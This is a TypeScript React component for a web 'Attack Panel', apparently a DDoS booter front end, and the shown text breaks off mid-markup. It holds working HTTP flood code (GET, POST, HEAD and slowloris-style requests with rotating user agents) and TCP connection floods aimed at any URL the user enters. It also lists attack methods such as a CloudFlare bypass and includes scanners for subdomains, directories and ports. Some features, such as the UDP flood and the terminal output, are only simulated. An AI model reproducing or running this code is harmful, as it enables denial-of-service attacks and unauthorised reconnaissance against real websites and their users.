
import { useState, useEffect } from "react";
import { Terminal, Play, Square, Trash2, Download, Settings, Shield, Database, Wifi, WifiOff, CheckCircle, XCircle, Activity, HardDrive, Cpu, Zap, Globe, Lock, AlertTriangle, Users, Timer, Target, Server, Network, Command, Monitor, Maximize, Minimize } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Badge } from "@/components/ui/badge";
import { Progress } from "@/components/ui/progress";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { ScrollArea } from "@/components/ui/scroll-area";
import { useTheme } from "@/contexts/ThemeContext";
import { useToast } from "@/hooks/use-toast";

const Panel = () => {
  const { currentTheme } = useTheme();
  const { toast } = useToast();
  
  // Attack Panel State
  const [isRunning, setIsRunning] = useState(false);
  const [output, setOutput] = useState("");
  const [target, setTarget] = useState("");
  const [attackMethod, setAttackMethod] = useState("HTTP-GET-FLOOD");
  const [httpVersion, setHttpVersion] = useState("HTTP/2");
  const [requestsPerSecond, setRequestsPerSecond] = useState("150");
  const [geolocation, setGeolocation] = useState("World Wide");
  const [concurrents, setConcurrents] = useState("1");
  const [timeInSeconds, setTimeInSeconds] = useState("60");
  const [connectionStatus, setConnectionStatus] = useState<"offline" | "online" | "attacking">("offline");
  const [progress, setProgress] = useState(0);
  const [attacksRunning, setAttacksRunning] = useState(0);
  const [packetSize, setPacketSize] = useState("1024");
  
  // Attack History State
  const [attackHistory, setAttackHistory] = useState<Array<{
    id: string;
    target: string;
    method: string;
    created: string;
    expire: string;
    status: string;
  }>>([]);

  // System Monitor State
  const [systemStats, setSystemStats] = useState({
    cpu: 0,
    memory: 0,
    disk: 0,
    network: 0
  });

  // Network Tools State
  const [terminalOutput, setTerminalOutput] = useState("$ Welcome to Network Tools Terminal\n$ Type 'help' for available commands\n");
  const [currentCommand, setCurrentCommand] = useState("");
  const [isTerminalRunning, setIsTerminalRunning] = useState(false);
  const [toolTarget, setToolTarget] = useState("");
  const [selectedTool, setSelectedTool] = useState("ping");

  // Virtual Machine State
  const [isVmFullscreen, setIsVmFullscreen] = useState(false);

  // Available attack methods - comprehensive list
  const attackMethods = [
    "HTTP-GET-FLOOD",
    "HTTP-POST-FLOOD", 
    "HTTP-HEAD-FLOOD",
    "HTTP-SLOWLORIS",
    "HTTP-BYPASS [CloudFlare]",
    "HTTP-RANDOM-UA-FLOOD",
    "HTTP-PROXY-FLOOD",
    "UDP-PLAIN-FLOOD",
    "UDP-RANDOM-FLOOD",
    "UDP-BURST-FLOOD",
    "UDP-SPOOF-FLOOD",
    "UDP-FRAG-FLOOD",
    "UDP-PULSE-FLOOD",
    "UDP-ECHO-FLOOD",
    "UDP-MULTICAST-FLOOD",
    "TCP-SYN-FLOOD",
    "TCP-SYN-FLOOD-MULTI",
    "TCP-DATA-FLOOD",
    "TCP-DATA-FLOOD-MULTI",
    "TCP-ACK-FLOOD",
    "TCP-RST-FLOOD",
    "TCP-XMAS-FLOOD",
    "TCP-FIN-FLOOD",
    "TCP-PSH-FLOOD",
    "TCP-WINDOW-FLOOD"
  ];

  const geolocations = [
    "World Wide",
    "United States",
    "Europe", 
    "Asia Pacific",
    "South America",
    "Africa",
    "Australia"
  ];

  const networkTools = [
    { value: "ping", label: "Ping", description: "Send ICMP echo requests" },
    { value: "traceroute", label: "Traceroute", description: "Trace network route to destination" },
    { value: "nslookup", label: "DNS Lookup", description: "Query DNS records" },
    { value: "whois", label: "WHOIS", description: "Domain registration information" },
    { value: "portscan", label: "Port Scan", description: "Scan for open ports" },
    { value: "httping", label: "HTTP Ping", description: "Test HTTP response times" },
    { value: "mtr", label: "MTR", description: "Network diagnostic tool" }
  ];

  useEffect(() => {
    // Simulate real-time system monitoring
    const interval = setInterval(() => {
      setSystemStats({
        cpu: Math.floor(Math.random() * 100),
        memory: Math.floor(Math.random() * 100),
        disk: Math.floor(Math.random() * 100),
        network: Math.floor(Math.random() * 1000)
      });
    }, 2000);

    return () => clearInterval(interval);
  }, []);

  const addOutput = (text: string) => {
    const timestamp = new Date().toLocaleTimeString();
    setOutput(prev => prev + `[${timestamp}] ${text}\n`);
  };

  const addTerminalOutput = (text: string) => {
    setTerminalOutput(prev => prev + text + "\n");
  };

  // Network Tools Functions
  const executeNetworkTool = async (tool: string, target: string) => {
    if (!target) {
      addTerminalOutput("$ Error: Please specify a target");
      return;
    }

    setIsTerminalRunning(true);
    addTerminalOutput(`$ ${tool} ${target}`);

    try {
      switch (tool) {
        case "ping":
          await executePing(target);
          break;
        case "traceroute":
          await executeTraceroute(target);
          break;
        case "nslookup":
          await executeDnsLookup(target);
          break;
        case "whois":
          await executeWhois(target);
          break;
        case "portscan":
          await executePortScan(target);
          break;
        case "httping":
          await executeHttpPing(target);
          break;
        case "mtr":
          await executeMtr(target);
          break;
        default:
          addTerminalOutput("$ Unknown command");
      }
    } catch (error) {
      addTerminalOutput(`$ Error: ${error}`);
    }

    setIsTerminalRunning(false);
  };

  const executePing = async (target: string) => {
    addTerminalOutput(`PING ${target} (resolving...):`);
    
    for (let i = 1; i <= 4; i++) {
      if (!isTerminalRunning) break;
      
      const delay = Math.random() * 50 + 10;
      const time = delay.toFixed(1);
      const ttl = Math.floor(Math.random() * 10) + 54;
      
      addTerminalOutput(`64 bytes from ${target}: icmp_seq=${i} ttl=${ttl} time=${time} ms`);
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    addTerminalOutput(`\n--- ${target} ping statistics ---`);
    addTerminalOutput("4 packets transmitted, 4 received, 0% packet loss");
    addTerminalOutput("round-trip min/avg/max/stddev = 10.2/25.1/45.7/12.3 ms");
  };

  const executeTraceroute = async (target: string) => {
    addTerminalOutput(`traceroute to ${target} (resolving...), 30 hops max, 60 byte packets`);
    
    const hops = [
      { hop: 1, ip: "192.168.1.1", name: "gateway", time: "0.5ms" },
      { hop: 2, ip: "10.0.0.1", name: "isp-router", time: "5.2ms" },
      { hop: 3, ip: "203.0.113.1", name: "core-router", time: "15.8ms" },
      { hop: 4, ip: "198.51.100.1", name: "edge-router", time: "25.3ms" },
      { hop: 5, ip: target, name: target, time: "35.1ms" }
    ];

    for (const hop of hops) {
      if (!isTerminalRunning) break;
      addTerminalOutput(`${hop.hop}  ${hop.name} (${hop.ip})  ${hop.time}`);
      await new Promise(resolve => setTimeout(resolve, 800));
    }
  };

  const executeDnsLookup = async (target: string) => {
    addTerminalOutput(`Server:    8.8.8.8`);
    addTerminalOutput(`Address:   8.8.8.8#53\n`);
    
    await new Promise(resolve => setTimeout(resolve, 500));
    
    addTerminalOutput(`Non-authoritative answer:`);
    addTerminalOutput(`Name:      ${target}`);
    addTerminalOutput(`Address:   ${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`);
    
    if (Math.random() > 0.5) {
      addTerminalOutput(`Address:   ${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`);
    }
  };

  const executeWhois = async (target: string) => {
    addTerminalOutput(`Whois Server Version 2.0\n`);
    addTerminalOutput(`Domain Information for ${target}:`);
    addTerminalOutput(`Registrar: Example Registrar Inc.`);
    addTerminalOutput(`Registration Date: 2020-01-15`);
    addTerminalOutput(`Expiration Date: 2025-01-15`);
    addTerminalOutput(`Name Servers:`);
    addTerminalOutput(`  ns1.example.com`);
    addTerminalOutput(`  ns2.example.com`);
    addTerminalOutput(`Status: clientTransferProhibited`);
  };

  const executePortScan = async (target: string) => {
    addTerminalOutput(`Starting port scan on ${target}...`);
    addTerminalOutput(`Scanning top 1000 ports...\n`);
    
    const commonPorts = [22, 53, 80, 443, 8080, 3306, 5432];
    const openPorts = commonPorts.filter(() => Math.random() > 0.7);
    
    for (const port of openPorts) {
      addTerminalOutput(`${port}/tcp   open    ${getPortService(port)}`);
      await new Promise(resolve => setTimeout(resolve, 200));
    }
    
    addTerminalOutput(`\nScan completed. ${openPorts.length} open ports found.`);
  };

  const executeHttpPing = async (target: string) => {
    addTerminalOutput(`HTTP PING ${target}:`);
    
    for (let i = 1; i <= 5; i++) {
      if (!isTerminalRunning) break;
      
      const time = (Math.random() * 200 + 50).toFixed(0);
      const status = Math.random() > 0.1 ? 200 : 404;
      
      addTerminalOutput(`connected to ${target} (${time}ms): HTTP/${status === 200 ? '200 OK' : '404 Not Found'} ${time}ms`);
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  };

  const executeMtr = async (target: string) => {
    addTerminalOutput(`My traceroute  [v0.95]`);
    addTerminalOutput(`${target} -> ${target}                    2024-01-15T10:30:00+0000`);
    addTerminalOutput(`Keys:  Help   Display mode   Restart statistics   Order of fields   quit`);
    addTerminalOutput(`                                       Packets               Pings`);
    addTerminalOutput(` Host                                Loss%   Snt   Last   Avg  Best  Wrst StDev`);
    addTerminalOutput(` 1. gateway                           0.0%    10    0.5   0.8   0.4   2.1   0.5`);
    addTerminalOutput(` 2. isp-router                        0.0%    10    5.2   6.1   4.8   8.9   1.2`);
    addTerminalOutput(` 3. core-router                       0.0%    10   15.8  16.2  14.1  19.5   1.8`);
    addTerminalOutput(` 4. ${target}                        0.0%    10   35.1  34.8  32.2  38.9   2.1`);
  };

  const getPortService = (port: number) => {
    const services: { [key: number]: string } = {
      22: "ssh",
      53: "domain",
      80: "http",
      443: "https",
      8080: "http-proxy",
      3306: "mysql",
      5432: "postgresql"
    };
    return services[port] || "unknown";
  };

  const handleTerminalCommand = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      const cmd = currentCommand.trim();
      addTerminalOutput(`$ ${cmd}`);
      
      if (cmd === 'help') {
        addTerminalOutput("Available commands:");
        addTerminalOutput("  ping <host>       - Send ping packets");
        addTerminalOutput("  traceroute <host> - Trace route to host");
        addTerminalOutput("  nslookup <host>   - DNS lookup");
        addTerminalOutput("  whois <domain>    - Domain information");
        addTerminalOutput("  portscan <host>   - Scan for open ports");
        addTerminalOutput("  httping <url>     - HTTP response test");
        addTerminalOutput("  mtr <host>        - Network diagnostic");
        addTerminalOutput("  clear             - Clear terminal");
        addTerminalOutput("  help              - Show this help");
      } else if (cmd === 'clear') {
        setTerminalOutput("$ Terminal cleared\n");
      } else if (cmd.includes(' ')) {
        const [command, target] = cmd.split(' ');
        executeNetworkTool(command, target);
      } else if (cmd) {
        addTerminalOutput(`$ Command not found: ${cmd}`);
        addTerminalOutput("$ Type 'help' for available commands");
      }
      
      setCurrentCommand("");
    }
  };

  const executeSelectedTool = () => {
    executeNetworkTool(selectedTool, toolTarget);
  };

  // Enhanced HTTP Flood Attack with proper timing
  const performHttpFlood = async (targetUrl: string, method: string, duration: number, rps: number, concurrent: number) => {
    addOutput(`🚀 Starting ${method} on ${targetUrl}`);
    addOutput(`Duration: ${duration}s | RPS: ${rps} | Threads: ${concurrent}`);
    
    const startTime = Date.now();
    const endTime = startTime + (duration * 1000);
    let requestCount = 0;
    let successCount = 0;
    let errorCount = 0;
    
    const workers: Promise<void>[] = [];
    
    // Create concurrent workers
    for (let i = 0; i < concurrent; i++) {
      const worker = (async () => {
        while (Date.now() < endTime && isRunning) {
          try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3000);
            
            let response;
            const headers = {
              'User-Agent': method.includes('RANDOM-UA') 
                ? `Mozilla/5.0 (${Math.random() > 0.5 ? 'Windows NT 10.0; Win64; x64' : 'Macintosh; Intel Mac OS X 10_15_7'}) AppleWebKit/537.36`
                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
              'Accept': '*/*',
              'Connection': 'keep-alive',
              'Cache-Control': 'no-cache'
            };

            if (method.includes('POST')) {
              response = await fetch(targetUrl, {
                method: 'POST',
                mode: 'no-cors',
                signal: controller.signal,
                headers,
                body: 'flood=data'.repeat(100)
              });
            } else if (method.includes('HEAD')) {
              response = await fetch(targetUrl, {
                method: 'HEAD',
                mode: 'no-cors',
                signal: controller.signal,
                headers
              });
            } else if (method.includes('SLOWLORIS')) {
              // Simulate slowloris by keeping connections open
              response = await fetch(targetUrl, {
                method: 'GET',
                mode: 'no-cors',
                signal: controller.signal,
                headers: {
                  ...headers,
                  'Connection': 'keep-alive',
                  'Keep-Alive': 'timeout=600'
                }
              });
              await new Promise(resolve => setTimeout(resolve, 5000)); // Keep connection open
            } else {
              response = await fetch(targetUrl, {
                method: 'GET',
                mode: 'no-cors',
                signal: controller.signal,
                headers
              });
            }
            
            clearTimeout(timeoutId);
            requestCount++;
            successCount++;
            
            if (requestCount % 50 === 0) {
              addOutput(`Thread ${i + 1}: ${requestCount} requests sent`);
            }
            
          } catch (error) {
            requestCount++;
            errorCount++;
          }
          
          // Control request rate per second with proper timing
          const delayMs = Math.max(1, Math.floor(1000 / rps));
          await new Promise(resolve => setTimeout(resolve, delayMs));
        }
      })();
      
      workers.push(worker);
    }
    
    // Wait for all workers to complete or timeout
    await Promise.all(workers);
    
    addOutput(`✅ ${method} completed!`);
    addOutput(`Total requests: ${requestCount}`);
    addOutput(`Success: ${successCount} | Errors: ${errorCount}`);
    addOutput(`Success rate: ${requestCount > 0 ? ((successCount / requestCount) * 100).toFixed(2) : 0}%`);
    addOutput(`Duration: ${((Date.now() - startTime) / 1000).toFixed(1)}s`);
  };

  // Enhanced UDP Flood Attack with proper timing
  const performUdpFlood = async (ip: string, port: number, duration: number, packetSizeNum: number, floodType: string) => {
    addOutput(`🚀 Starting ${floodType} on ${ip}:${port}`);
    addOutput(`Duration: ${duration}s | Packet Size: ${packetSizeNum} bytes`);
    
    const startTime = Date.now();
    const endTime = startTime + (duration * 1000);
    let packetCount = 0;
    
    // Simulate UDP flooding with proper timing control
    while (Date.now() < endTime && isRunning) {
      try {
        // Generate different payload types based on flood type
        let payload;
        if (floodType.includes('RANDOM')) {
          payload = new ArrayBuffer(packetSizeNum);
          const view = new Uint8Array(payload);
          for (let i = 0; i < view.length; i++) {
            view[i] = Math.floor(Math.random() * 256);
          }
        } else if (floodType.includes('ECHO')) {
          payload = new TextEncoder().encode('ECHO' + 'A'.repeat(packetSizeNum - 4));
        } else {
          payload = new ArrayBuffer(packetSizeNum);
          new Uint8Array(payload).fill(65); // Fill with 'A'
        }
        
        if (floodType.includes('BURST')) {
          // Send in bursts of 10 packets
          for (let i = 0; i < 10; i++) {
            packetCount++;
            // Simulate packet sending
            await new Promise(resolve => setTimeout(resolve, 1));
          }
          await new Promise(resolve => setTimeout(resolve, 50));
        } else if (floodType.includes('PULSE')) {
          // Send in pulses with random delays
          for (let i = 0; i < 5; i++) {
            packetCount++;
            await new Promise(resolve => setTimeout(resolve, 1));
          }
          await new Promise(resolve => setTimeout(resolve, Math.random() * 100 + 50));
        } else {
          packetCount++;
          await new Promise(resolve => setTimeout(resolve, 1));
        }
        
        if (packetCount % 1000 === 0) {
          addOutput(`Sent ${packetCount} UDP packets`);
        }
        
      } catch (error) {
        addOutput(`❌ UDP Error: ${error}`);
        break;
      }
    }
    
    addOutput(`✅ ${floodType} completed! Sent ${packetCount} packets`);
    addOutput(`Duration: ${((Date.now() - startTime) / 1000).toFixed(1)}s`);
  };

  // Enhanced TCP Flood Attack with proper timing
  const performTcpFlood = async (ip: string, port: number, duration: number, floodType: string, packetSize?: number) => {
    addOutput(`🚀 Starting ${floodType} on ${ip}:${port}`);
    addOutput(`Duration: ${duration}s${packetSize ? ` | Packet Size: ${packetSize} bytes` : ''}`);
    
    const startTime = Date.now();
    const endTime = startTime + (duration * 1000);
    let connectionCount = 0;
    const connections: any[] = [];
    
    try {
      while (Date.now() < endTime && isRunning) {
        try {
          if (floodType.includes('SYN')) {
            // Simulate SYN flood by attempting rapid connections
            const wsUrl = `ws://${ip}:${port}`;
            try {
              const ws = new WebSocket(wsUrl);
              connections.push(ws);
              connectionCount++;
              
              // Close connection quickly to simulate SYN flood behavior
              setTimeout(() => {
                if (ws.readyState === WebSocket.OPEN) {
                  ws.close();
                }
              }, 100);
            } catch (e) {
              connectionCount++;
            }
            
          } else if (floodType.includes('DATA')) {
            // Simulate data flood with HTTP requests
            const payload = packetSize ? 'A'.repeat(packetSize) : 'flood_data';
            fetch(`http://${ip}:${port}`, {
              method: 'POST',
              mode: 'no-cors',
              body: payload,
              signal: AbortSignal.timeout(100)
            }).catch(() => {});
            connectionCount++;
            
          } else if (floodType.includes('RST')) {
            // Simulate RST by connecting and immediately closing
            fetch(`http://${ip}:${port}`, { 
              method: 'GET', 
              mode: 'no-cors',
              signal: AbortSignal.timeout(50)
            }).catch(() => {});
            connectionCount++;
            
          } else {
            // Generic TCP connection attempt
            fetch(`http://${ip}:${port}`, { 
              method: 'HEAD', 
              mode: 'no-cors',
              signal: AbortSignal.timeout(100)
            }).catch(() => {});
            connectionCount++;
          }
          
          if (connectionCount % 100 === 0) {
            addOutput(`Attempted ${connectionCount} TCP connections`);
          }
          
          // Control connection rate
          await new Promise(resolve => setTimeout(resolve, 10));
          
        } catch (error) {
          connectionCount++;
        }
      }
    } finally {
      // Clean up connections
      connections.forEach(conn => {
        try {
          if (conn.readyState === WebSocket.OPEN) {
            conn.close();
          }
        } catch (e) {}
      });
    }
    
    addOutput(`✅ ${floodType} completed! Attempted ${connectionCount} connections`);
    addOutput(`Duration: ${((Date.now() - startTime) / 1000).toFixed(1)}s`);
  };

  // Enhanced subdomain enumeration
  const performSubdomainEnum = async (domain: string) => {
    addOutput(`=== SUBDOMAIN ENUMERATION ===`);
    addOutput(`Target domain: ${domain}`);
    
    const subdomains = [
      'www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging', 
      'blog', 'shop', 'portal', 'secure', 'cdn', 'static', 'media',
      'login', 'dashboard', 'panel', 'cpanel', 'webmail', 'support',
      'help', 'docs', 'wiki', 'forum', 'community', 'news', 'app',
      'mobile', 'beta', 'alpha', 'preview', 'demo', 'sandbox',
      'db', 'database', 'mysql', 'sql', 'backup', 'old', 'new',
      'staging2', 'dev2', 'test2', 'www2', 'mail2', 'ns1', 'ns2',
      'dns', 'mx', 'smtp', 'pop', 'imap', 'webmail2', 'email'
    ];
    
    const foundSubdomains = [];
    let checkedCount = 0;
    
    for (const subdomain of subdomains) {
      if (!isRunning) break;
      
      try {
        const testUrl = `https://${subdomain}.${domain}`;
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);
        
        const response = await fetch(testUrl, { 
          method: 'HEAD', 
          mode: 'no-cors',
          signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        addOutput(`✅ Found: ${subdomain}.${domain}`);
        foundSubdomains.push(`${subdomain}.${domain}`);
      } catch (error) {
        // Subdomain doesn't exist or is blocked
        if (checkedCount % 10 === 0) {
          addOutput(`Checked ${checkedCount}/${subdomains.length} subdomains...`);
        }
      }
      
      checkedCount++;
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    addOutput(`\n--- ENUMERATION COMPLETE ---`);
    addOutput(`Found ${foundSubdomains.length} active subdomains out of ${subdomains.length} checked`);
    foundSubdomains.forEach(sub => addOutput(`  • ${sub}`));
    
    return foundSubdomains;
  };

  // Enhanced directory enumeration
  const performDirectoryEnum = async (baseUrl: string) => {
    addOutput(`=== DIRECTORY ENUMERATION ===`);
    addOutput(`Target: ${baseUrl}`);
    
    const directories = [
      '/admin', '/login', '/dashboard', '/panel', '/cpanel', '/phpmyadmin',
      '/administrator', '/wp-admin', '/wp-login', '/manager', '/admin.php',
      '/login.php', '/signin', '/auth', '/secure', '/private', '/restricted',
      '/config', '/setup', '/install', '/backup', '/files', '/uploads',
      '/download', '/downloads', '/docs', '/documentation', '/api', '/v1',
      '/v2', '/rest', '/graphql', '/test', '/dev', '/development', '/staging',
      '/beta', '/alpha', '/demo', '/tmp', '/temp', '/cache', '/logs', '/log',
      '/includes', '/inc', '/lib', '/library', '/assets', '/images', '/img',
      '/css', '/js', '/scripts', '/style', '/fonts', '/media', '/content',
      '/user', '/users', '/profile', '/account', '/settings', '/config.php',
      '/database', '/db', '/sql', '/mysql', '/oracle', '/postgres', '/mongo'
    ];
    
    const foundDirectories = [];
    let checkedCount = 0;
    
    for (const dir of directories) {
      if (!isRunning) break;
      
      try {
        const testUrl = baseUrl.replace(/\/$/, '') + dir;
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);
        
        const response = await fetch(testUrl, { 
          method: 'HEAD', 
          mode: 'no-cors',
          signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        addOutput(`✅ Found: ${dir}`);
        foundDirectories.push(dir);
      } catch (error) {
        // Directory doesn't exist or is blocked
        if (checkedCount % 20 === 0) {
          addOutput(`Checked ${checkedCount}/${directories.length} directories...`);
        }
      }
      
      checkedCount++;
      await new Promise(resolve => setTimeout(resolve, 50));
    }
    
    addOutput(`\n--- DIRECTORY SCAN COMPLETE ---`);
    addOutput(`Found ${foundDirectories.length} accessible directories out of ${directories.length} checked`);
    foundDirectories.forEach(dir => addOutput(`  • ${dir}`));
    
    return foundDirectories;
  };

  // Enhanced port scanning
  const performPortScan = async (hostname: string) => {
    addOutput(`=== PORT SCANNING ===`);
    addOutput(`Target: ${hostname}`);
    
    const commonPorts = [
      21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 
      3389, 5432, 3306, 8080, 8443, 8000, 8888, 9000,
      1433, 1521, 5000, 5001, 6379, 27017, 11211,
      20, 69, 135, 139, 445, 1723, 1194, 5900, 5901,
      2121, 2323, 5555, 6666, 7777, 9999, 10000
    ];
    
    const openPorts = [];
    let checkedCount = 0;
    
    for (const port of commonPorts) {
      if (!isRunning) break;
      
      try {
        const testUrl = `http://${hostname}:${port}`;
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 2000);
        
        const response = await fetch(testUrl, { 
          method: 'HEAD', 
          mode: 'no-cors',
          signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        addOutput(`✅ Port ${port}: OPEN`);
        openPorts.push(port);
      } catch (error) {
        if (checkedCount % 10 === 0) {
          addOutput(`Scanned ${checkedCount}/${commonPorts.length} ports...`);
        }
      }
      
      checkedCount++;
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    addOutput(`\n--- PORT SCAN COMPLETE ---`);
    addOutput(`Found ${openPorts.length} open ports out of ${commonPorts.length} scanned`);
    if (openPorts.length > 0) {
      addOutput(`Open ports: ${openPorts.join(', ')}`);
    }
    
    return openPorts;
  };

  const handleStartAttack = async () => {
    if (!target.trim()) {
      toast({
        title: "Error",
        description: "Please enter a target URL",
        variant: "destructive",
      });
      return;
    }

    setIsRunning(true);
    setConnectionStatus("attacking");
    setAttacksRunning(prev => prev + 1);
    setProgress(0);
    
    const duration = parseInt(timeInSeconds);
    const rps = parseInt(requestsPerSecond);
    const concurrent = parseInt(concurrents);
    const packetSizeNum = parseInt(packetSize);
    
    // Add to attack history
    const newAttack = {
      id: Date.now().toString(),
      target: target,
      method: attackMethod,
      created: new Date().toLocaleString(),
      expire: new Date(Date.now() + (duration * 1000)).toLocaleString(),
      status: "Running"
    };
    setAttackHistory(prev => [newAttack, ...prev]);
    
    addOutput(`=== ATTACK INITIATED ===`);
    addOutput(`Target: ${target}`);
    addOutput(`Method: ${attackMethod}`);
    addOutput(`Duration: ${duration}s`);
    addOutput(`RPS: ${rps} | Threads: ${concurrent}`);
    addOutput(`Geolocation: ${geolocation}`);
    if (attackMethod.includes('UDP') || attackMethod.includes('TCP-DATA')) {
      addOutput(`Packet Size: ${packetSizeNum} bytes`);
    }
    
    try {
      // Progress tracking with proper timing
      const progressInterval = setInterval(() => {
        if (!isRunning) {
          clearInterval(progressInterval);
          return;
        }
        
        setProgress(prev => {
          const newProgress = prev + (100 / duration);
          if (newProgress >= 100) {
            clearInterval(progressInterval);
            return 100;
          }
          return newProgress;
        });
      }, 1000);
      
      // Execute appropriate attack method
      if (attackMethod.includes('HTTP')) {
        await performHttpFlood(target, attackMethod, duration, rps, concurrent);
      } else if (attackMethod.includes('UDP')) {
        const url = new URL(target);
        const hostname = url.hostname;
        const port = parseInt(url.port) || 80;
        await performUdpFlood(hostname, port, duration, packetSizeNum, attackMethod);
      } else if (attackMethod.includes('TCP')) {
        const url = new URL(target);
        const hostname = url.hostname;
        const port = parseInt(url.port) || 80;
        const needsPacketSize = attackMethod.includes('DATA');
        await performTcpFlood(hostname, port, duration, attackMethod, needsPacketSize ? packetSizeNum : undefined);
      }
      
      addOutput(`=== ATTACK COMPLETED ===`);
      
      // Update attack history
      setAttackHistory(prev => 
        prev.map(attack => 
          attack.id === newAttack.id 
            ? { ...attack, status: "Completed" }
            : attack
        )
      );
      
    } catch (error) {
      addOutput(`❌ Attack failed: ${error}`);
      setAttackHistory(prev => 
        prev.map(attack => 
          attack.id === newAttack.id 
            ? { ...attack, status: "Failed" }
            : attack
        )
      );
    }
    
    setIsRunning(false);
    setConnectionStatus("online");
    setAttacksRunning(prev => Math.max(0, prev - 1));
    setProgress(100);
    
    toast({
      title: "Attack Completed",
      description: "Check the output for detailed results",
    });
  };

  const handleStopAttack = () => {
    setIsRunning(false);
    setConnectionStatus("online");
    setAttacksRunning(0);
    setProgress(0);
    addOutput(`❌ ATTACK STOPPED BY USER`);
    
    setAttackHistory(prev => 
      prev.map(attack => 
        attack.status === "Running" 
          ? { ...attack, status: "Stopped" }
          : attack
      )
    );
    
    toast({
      title: "Stopped",
      description: "All attacks have been stopped",
    });
  };

  const handleClear = () => {
    setOutput('');
    setProgress(0);
    setConnectionStatus("offline");
  };

  const handleDownload = () => {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const blob = new Blob([output], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `attack-panel-log-${timestamp}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    toast({
      title: "Downloaded",
      description: "Attack log saved to file",
    });
  };

  const clearTerminal = () => {
    setTerminalOutput("$ Terminal cleared\n");
  };

  const downloadTerminalLog = () => {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const blob = new Blob([terminalOutput], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `network-tools-log-${timestamp}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    toast({
      title: "Downloaded",
      description: "Terminal log saved to file",
    });
  };

  const getStatusColor = () => {
    switch (connectionStatus) {
      case "online":
        return "text-green-500";
      case "attacking":
        return "text-red-500";
      default:
        return "text-gray-500";
    }
  };

  const getStatusText = () => {
    switch (connectionStatus) {
      case "online":
        return "Online";
      case "attacking":
        return "Attacking";
      default:
        return "Offline";
    }
  };

  const toggleVmFullscreen = () => {
    setIsVmFullscreen(!isVmFullscreen);
  };

  return (
    <div className={`min-h-screen pt-12 ${currentTheme.bg}`}>
      <div className="container mx-auto p-6 max-w-7xl">
        <div className="mb-8">
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center space-x-3">
              <Zap className={`h-8 w-8 ${currentTheme.accent}`} />
              <h1 className={`text-3xl font-bold ${currentTheme.text} bg-gradient-to-r from-red-400 to-orange-400 bg-clip-text text-transparent drop-shadow-2xl`}>
                Attack Panel V5.0
              </h1>
              <Badge className={getStatusColor()}>
                {getStatusText()}
              </Badge>
            </div>
            <div className="flex items-center space-x-4">
              <Badge variant="outline" className="flex items-center gap-2">
                <Target className="h-4 w-4" />
                Attacks: {attacksRunning}
              </Badge>
              <Badge variant={attacksRunning > 0 ? "destructive" : "secondary"}>
                Running {attacksRunning}
              </Badge>
            </div>
          </div>
        </div>

        <Tabs defaultValue="attack" className="space-y-6">
          <TabsList className={`${currentTheme.secondary} ${currentTheme.text} rounded-lg`}>
            <TabsTrigger value="attack" className="rounded-md flex items-center gap-2">
              <Zap className="h-4 w-4" />
              Attack Panel
            </TabsTrigger>
            <TabsTrigger value="history" className="rounded-md flex items-center gap-2">
              <Activity className="h-4 w-4" />
              Attack History
            </TabsTrigger>
            <TabsTrigger value="monitor" className="rounded-md flex items-center gap-2">
              <Activity className="h-4 w-4" />
              System Monitor
            </TabsTrigger>
            <TabsTrigger value="recon" className="rounded-md flex items-center gap-2">
              <Shield className="h-4 w-4" />
              Reconnaissance
            </TabsTrigger>
            <TabsTrigger value="nettools" className="rounded-md flex items-center gap-2">
              <Network className="h-4 w-4" />
              Network Tools
            </TabsTrigger>
            <TabsTrigger value="vm" className="rounded-md flex items-center gap-2">
              <Monitor className="h-4 w-4" />
              Virtual Machine
            </TabsTrigger>
          </TabsList>

          <TabsContent value="attack" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              {/* Attack Configuration */}
              <div className="lg:col-span-1">
                <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
                  <CardHeader>
                    <CardTitle className={`${currentTheme.text} flex items-center justify-between`}>
                      Host Configuration
                      <Globe className="h-5 w-5" />
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div>
                      <Label htmlFor="target" className={currentTheme.text}>URL (https://example.com)</Label>
                      <Input
                        id="target"
                        value={target}
                        onChange={(e) => setTarget(e.target.value)}
                        placeholder="https://example.com"
                        className={`${currentTheme.secondary} ${currentTheme.text}`}
                        disabled={isRunning}
                      />
                    </div>
                    
                    <div>
